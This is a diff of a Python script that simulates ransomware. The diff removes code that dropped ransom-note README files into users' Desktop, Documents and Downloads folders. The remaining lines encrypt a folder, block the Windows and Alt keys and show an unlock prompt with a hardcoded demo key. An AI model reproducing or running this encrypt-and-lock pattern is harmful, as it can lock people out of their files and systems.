@@ -13,36 +13,7 @@ KEY_FILE = "encryption.key"
 # List of keys to block
 blocked_keys = ['left windows', 'right windows', 'alt', 'alt gr']
 
-# Define the directories for README.txt placement
-directories = [
-    os.path.expanduser('~/Desktop'),
-    os.path.expanduser('~/Documents'),
-    os.path.expanduser('~/Downloads'),
-]
-
-readme_content = """\
-========== MOCK RANSOMWARE ==========
-Your files have been encrypted (SIMULATED).
-
-To recover your data, please enter the provided DEMO KEY.
-This is ONLY a harmless demonstration.
-
-=====================================
-"""
-
 DEMO_KEY = "1234ABCD"
-
-def place_readme_files():
-    """
-    Places README.txt files in the preset directories.
-    """
-    for folder in directories:
-        try:
-            filepath = os.path.join(folder, "README.txt")
-            with open(filepath, 'w') as file:
-                file.write(readme_content)
-        except Exception as e:
-            print(f"Failed writing README in {folder}: {e}")
 
 def generate_key():
     """
@@ -130,6 +101,7 @@ def ransomware_prompt():
         if entry.get() == DEMO_KEY:
             messagebox.showinfo("Unlocked", "Correct key! Demo ended.")
             decrypt_folder(FOLDER_PATH, load_key())
+            
             window.destroy()
             exit(0)  # Exit the program
         else:
@@ -144,13 +116,11 @@ def ransomware_prompt():
     window.mainloop()
 
 if __name__ == "__main__":
-    place_readme_files()
-    
     while not os.path.exists(KEY_FILE):
         generate_key()
     encrypt_folder(FOLDER_PATH, load_key())
     
     for key in blocked_keys:
         keyboard.block_key(key)
-
+    
     ransomware_prompt()
